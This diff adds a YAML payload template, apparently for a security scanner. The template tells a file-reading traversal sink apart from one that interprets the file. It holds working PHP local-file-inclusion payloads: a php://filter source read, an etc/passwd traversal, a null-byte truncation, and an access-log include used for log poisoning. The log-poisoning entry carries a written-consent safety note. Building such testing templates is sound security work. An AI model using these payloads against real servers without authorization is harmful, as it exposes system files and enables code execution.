@@ -1,0 +1,41 @@
+# Distinguishing a path that is read from one that is interpreted. The
+# difference is the whole of the severity, and the response body frequently
+# looks the same either way -- an included PHP file returns its output, which on
+# a config file is often nothing at all.
+#
+# {{DEPTH}} is the traversal prefix and {{TARGET}} the file being asked for.
+id: traversal/inclusion
+reviewed: "2026-08-25"
+title: Reading versus interpreting the resolved path
+variables: [DEPTH, TARGET]
+safety: >-
+  The wrapper entries read source and are safe against a live target. The
+  log-poisoning entry writes attacker-controlled content into a file the server
+  will later interpret, which is a change to the target that cannot be undone
+  from outside. Do not run it without written agreement naming it specifically.
+credits:
+  - "Stream wrappers and log poisoning are long-standing public technique; the read/interpret framing is written for this project."
+entries:
+  - name: source read through a filter wrapper
+    platform: [php]
+    payload: "php://filter/convert.base64-encode/resource={{TARGET}}"
+    detect: "A base64 body that decodes to source rather than to the file's output."
+    note: "The discriminator, not merely a convenience: if this returns encoded source while the plain path returned nothing, the sink interprets rather than reads."
+
+  - name: known-output probe
+    platform: [php]
+    payload: "{{DEPTH}}etc/passwd"
+    detect: "Returned verbatim by a read sink; returned mangled or empty by an include, because the interpreter tries to parse it."
+    note: "Cheapest way to tell the two apart when wrappers are disabled."
+
+  - name: extension appended by the sink
+    platform: [php]
+    payload: "{{DEPTH}}etc/passwd%00"
+    detect: "Only meaningful where the response or an error shows the sink appending an extension."
+    note: "Truncation was fixed in PHP 5.3.4. Try it when a stack that old has already been identified, and not otherwise."
+
+  - name: interpreted log file
+    platform: [php]
+    payload: "{{DEPTH}}var/log/nginx/access.log"
+    detect: "Output of code previously written into the log through a request header, rather than the log's text."
+    note: "Two steps, and the first one writes. See this file's safety note before either."
